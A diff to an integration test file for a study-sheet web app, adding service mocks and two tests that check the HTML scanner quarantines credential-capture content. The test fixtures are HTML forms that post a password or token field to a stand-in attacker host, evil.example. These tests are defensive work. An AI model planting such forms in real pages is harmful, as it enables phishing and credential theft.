@@ -95,6 +95,7 @@ const mocks = vi.hoisted(() => {
         contentFormat: data.contentFormat || 'markdown',
         status: data.status || 'published',
         htmlScanStatus: data.htmlScanStatus || 'queued',
+        htmlRiskTier: data.htmlRiskTier || 0,
         htmlScanFindings: data.htmlScanFindings || null,
         htmlScanUpdatedAt: data.htmlScanUpdatedAt || null,
         htmlScanAcknowledgedAt: data.htmlScanAcknowledgedAt || null,
@@ -240,6 +241,15 @@ const mocks = vi.hoisted(() => {
       starredSheet: {
         findMany: vi.fn(async () => []),
       },
+      userPreferences: {
+        findUnique: vi.fn(async () => null),
+      },
+      moderationCase: {
+        create: vi.fn(async () => null),
+      },
+      provenanceManifest: {
+        upsert: vi.fn(async () => null),
+      },
     },
     requireAuth: (req, res, next) => {
       const userId = Number(req.headers['x-test-user-id'] || 101)
@@ -292,6 +302,27 @@ const mocks = vi.hoisted(() => {
     deleteUserAccount: {
       deleteUserAccount: vi.fn(async () => null),
     },
+    activityTracker: {
+      trackActivity: vi.fn(),
+    },
+    abuseDetection: {
+      runAbuseChecks: vi.fn(async () => null),
+    },
+    badges: {
+      checkAndAwardBadges: vi.fn(),
+    },
+    getUserPlan: {
+      getUserTier: vi.fn(async () => 'free'),
+    },
+    plagiarismFingerprint: {
+      updateFingerprint: vi.fn(async () => null),
+    },
+    plagiarism: {
+      findSimilarSheets: vi.fn(async () => []),
+    },
+    plagiarismScan: {
+      runPlagiarismScan: vi.fn(async () => null),
+    },
   }
 })
 
@@ -308,6 +339,13 @@ const mockTargets = new Map([
   [require.resolve('../src/lib/storage'), mocks.storage],
   [require.resolve('../src/lib/attachmentPreview'), mocks.attachmentPreview],
   [require.resolve('../src/lib/deleteUserAccount'), mocks.deleteUserAccount],
+  [require.resolve('../src/lib/activityTracker'), mocks.activityTracker],
+  [require.resolve('../src/lib/abuseDetection'), mocks.abuseDetection],
+  [require.resolve('../src/lib/badges'), mocks.badges],
+  [require.resolve('../src/lib/getUserPlan'), mocks.getUserPlan],
+  [require.resolve('../src/lib/plagiarismService'), mocks.plagiarismFingerprint],
+  [require.resolve('../src/lib/plagiarism'), mocks.plagiarism],
+  [require.resolve('../src/modules/plagiarism/plagiarism.service'), mocks.plagiarismScan],
 ])
 
 const originalModuleLoad = Module._load
@@ -347,6 +385,64 @@ beforeEach(() => {
 })
 
 describe('sheet workflow integration', () => {
+  it('quarantines credential-capture HTML during direct sheet creation', async () => {
+    const response = await request(app)
+      .post('/sheets')
+      .set('x-test-user-id', '101')
+      .set('x-test-role', 'student')
+      .send({
+        title: 'Credential Trap',
+        courseId: 10,
+        contentFormat: 'html',
+        allowDownloads: true,
+        content:
+          '<main><form action="https://evil.example/login"><input type="password" name="password"></form></main>',
+      })
+
+    expect(response.status).toBe(201)
+    expect(response.body.status).toBe('quarantined')
+    expect(response.body.htmlWorkflow.scanStatus).toBe('quarantined')
+    expect(response.body.htmlWorkflow.riskTier).toBe(3)
+    expect(response.body.htmlWorkflow.scanFindings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ category: 'credential-capture', severity: 'critical' }),
+      ]),
+    )
+  })
+
+  it('quarantines credential-capture HTML during direct sheet updates', async () => {
+    const createResponse = await request(app)
+      .post('/sheets')
+      .set('x-test-user-id', '101')
+      .set('x-test-role', 'student')
+      .send({
+        title: 'Safe Sheet',
+        courseId: 10,
+        contentFormat: 'markdown',
+        allowDownloads: true,
+        content: 'Safe notes for the course.',
+      })
+
+    expect(createResponse.status).toBe(201)
+
+    const updateResponse = await request(app)
+      .patch(`/sheets/${createResponse.body.id}`)
+      .set('x-test-user-id', '101')
+      .set('x-test-role', 'student')
+      .send({
+        title: 'Safe Sheet',
+        courseId: 10,
+        contentFormat: 'html',
+        content:
+          '<main><form action="https://evil.example/login"><input name="token" value=""></form></main>',
+      })
+
+    expect(updateResponse.status).toBe(200)
+    expect(updateResponse.body.status).toBe('quarantined')
+    expect(updateResponse.body.htmlWorkflow.scanStatus).toBe('quarantined')
+    expect(updateResponse.body.htmlWorkflow.riskTier).toBe(3)
+  })
+
   it('supports html import, working draft updates, scan status, and submit for review', async () => {
     const importResponse = await request(app)
       .post('/sheets/drafts/import-html')
